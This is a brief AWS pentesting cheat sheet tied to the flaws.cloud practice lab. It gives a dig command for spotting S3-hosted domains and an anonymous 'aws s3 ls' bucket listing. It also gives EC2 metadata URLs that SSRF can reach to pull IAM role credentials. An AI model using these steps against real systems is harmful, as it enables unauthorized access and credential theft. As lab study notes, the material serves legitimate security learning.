# AWS


## AWS S3

### Check if domain is on a bucket
```bash
dig +nocmd flaws.cloud any +multiline +noall +answer
```


### List a bucket
```bash
aws s3 ls s3://flaws.cloud/ --no-sign-request --region us-west-2
```

## SSRF on AWS to get credentials

On AWS there is a metadata server that can be accessed through the REST API
located at: `http://169.254.169.254`.
Sending a GET requests to the following endpoint will dump a list of roles that
are attaches to the current EC2 instance.

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role_name>
```

## Resources

- [flaws.cloud](http://flaws.cloud/)
